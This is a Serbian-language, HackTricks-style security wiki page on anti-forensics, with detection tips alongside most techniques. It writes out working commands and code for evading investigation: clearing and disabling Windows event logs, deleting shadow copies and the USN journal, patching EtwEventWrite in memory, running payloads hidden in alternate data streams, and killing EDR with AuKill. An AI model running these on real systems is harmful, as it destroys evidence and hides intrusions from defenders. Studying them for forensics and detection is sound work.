# Anti-forenzičke tehnike

{{#include ../../banners/hacktricks-training.md}}

## Vremenske oznake

Napadač može želeti da **izmeni vremenske oznake datoteka** kako bi izbegao otkrivanje.\
Vremenske oznake se mogu pronaći u MFT-u, u atributima `$STANDARD_INFORMATION` \_\_ i \_\_ `$FILE_NAME`.

Oba atributa imaju 4 vremenske oznake: **izmena**, **pristup**, **kreiranje** i **izmena MFT registra** (MACE ili MACB).

**Windows Explorer** i drugi alati prikazuju informacije iz **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forenzički alat

Ovaj alat **menja** informacije o vremenskim oznakama u okviru **`$STANDARD_INFORMATION`**, **ali ne** i informacije u okviru **`$FILE_NAME`**. Zato je moguće **identifikovati** **sumnjivu** **aktivnost**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. Alat [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) omogućava ispitivanje tih promena.

![TimeStomp - Anti-forenzički alat - Usnjrnl: USN Journal (Update Sequence Number Journal) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. ...](<../../images/image (801).png>)

Prethodna slika prikazuje **izlaz** alata, u kojem se može videti da su **izvršene neke promene** u datoteci.

### $LogFile

**Sve promene metapodataka u sistemu datoteka beleže se** u procesu poznatom kao [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zabeleženi metapodaci čuvaju se u datoteci pod nazivom `**$LogFile**`, koja se nalazi u korenskom direktorijumu NTFS sistema datoteka. Alati kao što je [LogFileParser](https://github.com/jschicht/LogFileParser) mogu da se koriste za parsiranje ove datoteke i identifikovanje promena.

![Usnjrnl - $LogFile: Sve promene metapodataka u sistemu datoteka beleže se u procesu poznatom kao write-ahead logging. Zabeleženi metapodaci čuvaju se u datoteci pod nazivom $LogFile , koja se nalazi u korenskom...](<../../images/image (137).png>)

Ponovo, u izlazu alata može se videti da su **izvršene neke promene**.

Istim alatom moguće je utvrditi **na koje vreme su vremenske oznake izmenjene**:

![Usnjrnl - $LogFile: Istim alatom moguće je utvrditi na koje vreme su vremenske oznake izmenjene](<../../images/image (1089).png>)

- CTIME: Vreme kreiranja datoteke
- ATIME: Vreme izmene datoteke
- MTIME: Vreme izmene MFT registra datoteke
- RTIME: Vreme pristupa datoteci

### Poređenje `$STANDARD_INFORMATION` i `$FILE_NAME`

Drugi način za identifikovanje sumnjivo izmenjenih datoteka jeste poređenje vremena u oba atributa radi pronalaženja **nepodudaranja**.

### Nanosekunde

Vremenske oznake u **NTFS-u** imaju **preciznost** od **100 nanosekundi**. Zato je pronalaženje datoteka sa vremenskim oznakama poput 2010-10-10 10:10:**00.000:0000 veoma sumnjivo**.

### SetMace - Anti-forenzički alat

Ovaj alat može da izmeni oba atributa, `$STARNDAR_INFORMATION` i `$FILE_NAME`. Međutim, počev od Windows Viste, za izmenu ovih informacija neophodan je pokrenut OS.

## Skrivanje podataka

NTFS koristi klastere i minimalnu veličinu informacija. To znači da ako datoteka zauzima klaster i po, **preostala polovina se nikada neće koristiti** dok se datoteka ne izbriše. Zatim je moguće **sakriti podatke u tom neiskorišćenom prostoru**.

Postoje alati poput slacker koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza `$logfile` i `$usnjrnl` može da pokaže da su neki podaci dodati:

![SetMace - Anti-forenzički alat - Skrivanje podataka: Postoje alati poput slacker koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza $logfile i $usnjrnl može da pokaže da su neki podaci...](<../../images/image (1060).png>)

Zatim je moguće preuzeti neiskorišćeni prostor pomoću alata kao što je FTK Imager. Imajte na umu da ovakvi alati mogu da sačuvaju sadržaj u izmenjenom obliku ili čak šifrovan.

## UsbKill

Ovaj alat će **isključiti računar ako otkrije bilo kakvu promenu na USB** portovima.\
Jedan od načina da se ovo otkrije jeste pregled pokrenutih procesa i **provera svake aktivne Python skripte**.

## Live Linux distribucije

Ove distribucije se **izvršavaju u RAM** memoriji. Jedini način da se otkriju jeste **ako je NTFS sistem datoteka montiran sa dozvolama za upis**. Ako je montiran samo sa dozvolama za čitanje, upad neće moći da se otkrije.

## Sigurno brisanje

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Odloženo samobrisanje u Windows-u

Pokrenuta Windows slika može biti zaključana dok je njen proces aktivan. Proces može da prepusti brisanje podređenom procesu `cmd.exe`, koristi `choice` kao tajmer i završi se pre nego što ljuska stigne do komande `del`. Odlaganje omogućava izvornom procesu da oslobodi svoj image handle; navođenje cele putanje pod navodnicima je neophodno ako ona sadrži razmake.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Kada se ovaj string prosleđuje direktno kao argument komandi `cmd.exe`, a ne unosi iz drugog interaktivnog `cmd` prompta, koristite `&` umesto `^&` i `>nul` umesto `^>nul`. Time se uklanja unos direktorijuma; ovo **nije bezbedno brisanje** i ne uklanja tragove izvršavanja, zadataka, dnevnika sistema datoteka ni druge forenzičke tragove. Potražite kratkotrajne procese-podređene `cmd.exe` čija komandna linija sadrži `choice /T`, `Del` i putanju do slike nadređenog procesa.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Konfiguracija Windows-a

Moguće je onemogućiti nekoliko metoda evidentiranja u Windows-u i time znatno otežati forenzičku istragu.

### Onemogućavanje vremenskih oznaka - UserAssist

Ovaj ključ registratora čuva datume i vreme pokretanja svake izvršne datoteke od strane korisnika.

Za onemogućavanje UserAssist-a potrebna su dva koraka:

1. Postavite oba ključa registratora `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` i `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` na nulu da biste naznačili da želite da onemogućite UserAssist.
2. Obrišite podstabla registratora koja izgledaju ovako: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Onemogućavanje vremenskih oznaka - Prefetch

Ova funkcija čuva informacije o pokrenutim aplikacijama radi poboljšanja performansi sistema Windows. Međutim, ove informacije mogu biti korisne i u forenzičkoj analizi.

- Pokrenite `regedit`
- Izaberite putanju datoteke `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknite desnim tasterom miša na `EnablePrefetcher` i `EnableSuperfetch`
- Izaberite Modify za svaku stavku da biste promenili vrednost sa 1 (ili 3) na 0
- Ponovo pokrenite sistem

### Onemogućavanje vremenskih oznaka - Vreme poslednjeg pristupa

Kad god se fascikla otvori sa NTFS volumena na Windows NT serveru, sistem ažurira polje vremenske oznake u svakoj izlistanoj fascikli, koje se naziva vreme poslednjeg pristupa. Na intenzivno korišćenom NTFS volumenu to može uticati na performanse.

1. Otvorite Registry Editor (Regedit.exe).
2. Idite na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Potražite `NtfsDisableLastAccessUpdate`. Ako ne postoji, dodajte ovaj DWORD i postavite mu vrednost na 1 da biste onemogućili ovaj proces.
4. Zatvorite Registry Editor i ponovo pokrenite server.

### Brisanje USB istorije

Svi **unosi USB uređaja** čuvaju se u Windows registratoru, pod ključem registratora **USBSTOR**, koji sadrži potključeve kreirane svaki put kada priključite USB uređaj na računar ili laptop. Ovaj ključ se nalazi ovde: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog ključa** briše se USB istorija.\
Možete koristiti i alatku [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) da biste proverili da li su unosi obrisani (i da biste ih obrisali).

Još jedna datoteka koja čuva informacije o USB uređajima je `setupapi.dev.log` u fascikli `C:\Windows\INF`. I nju treba obrisati.

### Onemogućavanje senčenih kopija

**Izlistajte** senčene kopije pomoću komande `vssadmin list shadowstorage`\
**Obrišite** ih pokretanjem komande `vssadmin delete shadow`

Možete ih obrisati i preko GUI-ja, prateći korake navedene na [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Da biste onemogućili senčene kopije, pratite [ove korake](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otvorite program Services tako što ćete nakon klika na dugme Start u Windows-u u polje za pretragu uneti "services".
2. Na listi pronađite "Volume Shadow Copy", izaberite ga, pa klikom desnim tasterom miša otvorite Properties.
3. U padajućem meniju "Startup type" izaberite Disabled, a zatim potvrdite promenu klikom na Apply i OK.

Moguće je i promeniti konfiguraciju datoteka koje će biti kopirane u senčenu kopiju, u registratoru `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Prepisivanje obrisanih datoteka

- Možete koristiti **Windows alatku**: `cipher /w:C`. Time se nalaže cipher-u da ukloni sve podatke iz dostupnog neiskorišćenog prostora na disku C.
- Možete koristiti i alatke kao što je [**Eraser**](https://eraser.heidi.ie)

### Brisanje dnevnika događaja sistema Windows

- Windows + R --> eventvwr.msc --> Proširite "Windows Logs" --> Kliknite desnim tasterom miša na svaku kategoriju i izaberite "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Onemogućavanje dnevnika događaja sistema Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- U odeljku services onemogućite uslugu "Windows Event Log"
- `WEvtUtil.exec clear-log` ili `WEvtUtil.exe cl`

### Onemogućavanje $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Napredno evidentiranje i izmena tragova (2023-2025)

### PowerShell ScriptBlock/Module evidentiranje

Novije verzije sistema Windows 10/11 i Windows Server čuvaju **opsežne PowerShell forenzičke artefakte** u
`Microsoft-Windows-PowerShell/Operational` (događaji 4104/4105/4106).  
Napadači mogu da ih onemoguće ili obrišu u hodu:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Branioci bi trebalo da prate izmene tih ključeva registra i uklanjanje velikog broja PowerShell događaja.

### ETW (Event Tracing for Windows) Patch

Endpoint security proizvodi se u velikoj meri oslanjaju na ETW. Popularna metoda zaobilaženja zaštite iz 2024. jeste da se u memoriji izmeni `ntdll!EtwEventWrite`/`EtwEventWriteFull`, tako da svaki ETW poziv vrati `STATUS_SUCCESS` bez emitovanja događaja:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Javni PoC-ovi (npr. `EtwTiSwallow`) implementiraju isti primitive u PowerShell-u ili C++.  
Pošto je zakrpa **lokalna za proces**, EDR-ovi koji rade unutar drugih procesa možda je neće detektovati.<sup>[[5]](#references)</sup>
Detekcija: uporedite `ntdll` u memoriji sa verzijom na disku ili postavite hook pre user-mode.

### Povratak Alternate Data Streams (ADS)

Primećeno je da malware kampanje iz 2023. godine (npr. **FIN12** loader-i) smeštaju binarne fajlove drugog stepena
unutar ADS-a kako bi ostali neprimećeni tradicionalnim skenerima:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Enumerišite stream-ove pomoću `dir /R`, `Get-Item -Stream *` ili Sysinternals alata `streams64.exe`.
Kopiranje host datoteke na FAT/exFAT ili putem SMB ukloniće skriveni stream i istražitelji mogu to iskoristiti
za oporavak payload-a.

### BYOVD & „AuKill“ (2023)

Bring-Your-Own-Vulnerable-Driver se sada rutinski koristi za **anti-forensics** pri ransomware upadima.  
Alat otvorenog koda **AuKill** učitava potpisani, ali ranjivi driver (`procexp152.sys`) kako bi
suspendovao ili prekinuo rad EDR i forenzičkih senzora **pre enkripcije i uništavanja logova**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Driver se nakon toga uklanja, ostavljajući minimalne artefakte.<sup>[[1]](#references)</sup>  
Mere zaštite: omogućite Microsoftovu listu blokiranih ranjivih upravljačkih programa (HVCI/SAC) i upozoravajte na kreiranje kernel usluga iz putanja u koje korisnik može da upisuje.

---

## Linux anti-forenzika: Self-patching i Cloud C2 (2023–2025)

### Self-patching kompromitovanih usluga radi smanjenja detekcije (Linux)
Napadači sve češće „self-patchuju“ uslugu odmah nakon njenog iskorišćavanja kako bi sprečili ponovnu eksploataciju i potisnuli detekcije zasnovane na ranjivostima. Ideja je da se ranjive komponente zamene najnovijim legitimnim upstream binarnim datotekama/JAR-ovima, tako da skeneri prijave da je host zakrpljen, dok postojanost i C2 ostaju aktivni.<sup>[[3]](#references)</sup>

Primer: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Nakon eksploatacije, napadači su preuzeli legitimne JAR-ove sa Maven Central (repo1.maven.org), izbrisali ranjive JAR-ove iz instalacije ActiveMQ-a i ponovo pokrenuli broker.
- Time je zatvorena početna RCE ranjivost, dok su ostali vektori pristupa ostali aktivni (cron, izmene SSH konfiguracije, zasebni C2 implantati).

Operativni primer (ilustrativno)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forenzički saveti i saveti za threat hunting
- Pregledajte direktorijume servisa i potražite zamene binarnih datoteka/JAR-ova koje nisu bile planirane:
  - Debian/Ubuntu: `dpkg -V activemq` i uporedite hash vrednosti/putanje datoteka sa repo mirror-ima.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Potražite verzije JAR-ova koje postoje na disku, ali nisu u vlasništvu package manager-a, kao i simboličke linkove koji su ažurirani van uobičajenih procedura.
- Vremenska linija: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` da biste povezali ctime/mtime sa periodom kompromitovanja.
- Shell istorija/telemetrija procesa: dokazi o korišćenju `curl`/`wget` za preuzimanje sa `repo1.maven.org` ili drugih artifact CDN-ova neposredno nakon prvobitne eksploatacije.
- Upravljanje izmenama: proverite ko je primenio „patch“ i zašto, a ne samo da je prisutna zakrpljena verzija.

### C2 preko cloud servisa sa bearer token-ima i anti-analysis stager-ima
Uočene TTP-ove kombinovale su više dugotrajnih C2 putanja i anti-analysis pakovanje:<sup>[[3]](#references)</sup>
- ELF loader-i zaštićeni lozinkom i napravljeni pomoću PyInstaller-a, radi otežavanja sandbox analize i statičke analize (npr. šifrovan PYZ, privremena ekstrakcija u `/_MEI*`).
  - Indikatori: rezultati `strings` kao što su `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Artefakti tokom izvršavanja: ekstrakcija u `/tmp/_MEI*` ili prilagođene putanje `--runtime-tmpdir`.
- C2 preko Dropbox-a pomoću hardkodiranih OAuth Bearer token-a
  - Mrežni indikatori: `api.dropboxapi.com` / `content.dropboxapi.com` uz `Authorization: Bearer <token>`.
  - Pretražite proxy/NetFlow/Zeek/Suricata podatke za odlazne HTTPS veze ka Dropbox domenima sa serverskih workload-a koji inače ne sinhronizuju datoteke.
- Paralelni/rezervni C2 preko tunelovanja (npr. Cloudflare Tunnel `cloudflared`), čime se održava kontrola ako je jedan kanal blokiran.
  - Host IOC-ovi: `cloudflared` procesi/jedinice, konfiguracija u `~/.cloudflared/*.json`, odlazne veze na portu 443 ka Cloudflare edge serverima.

### Održavanje pristupa kroz persistence i „vraćanje hardening-a“ (primeri za Linux)
Napadači često kombinuju samostalno zakrpljivanje sa trajnim načinima pristupa:<sup>[[3]](#references)</sup>
- Cron/Anacron: izmene `0anacron` stub datoteke u svakom direktorijumu `/etc/cron.*/` radi periodičnog izvršavanja.
  - Potražite:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Poništavanje hardening-a SSH konfiguracije: omogućavanje root prijavljivanja i izmena podrazumevanih shell-ova za naloge sa niskim privilegijama.
  - Potražite omogućavanje root prijavljivanja:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Потражите сумњиве интерактивне shell-ове на системским налозима (нпр. `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Nasumični beacon artefakti kratkog naziva (8 abecednih znakova), zapisani na disk, koji takođe komuniciraju sa cloud C2:
  - Potraži:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Branioci bi trebalo da povežu ove artefakte sa spoljnim izlaganjem i događajima zakrpavanja servisa kako bi otkrili anti-forenzičku samosanaciju korišćenu za prikrivanje početne eksploatacije.

## References

- [1] [Sophos X-Ops – Naoružani ranjivi drajver za onemogućavanje EDR-a (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Zakrpavanje EtwEventWrite radi prikrivanja: detekcija i lov na pretnje (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Zakrpavanje radi postojanosti: kako se Linux malware DripDropper kreće kroz cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Sakrivanje .NET-a – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Otkrivanje varijante SectopRAT-a ugrađene u legitiman softver](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – naredba choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – naredba del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
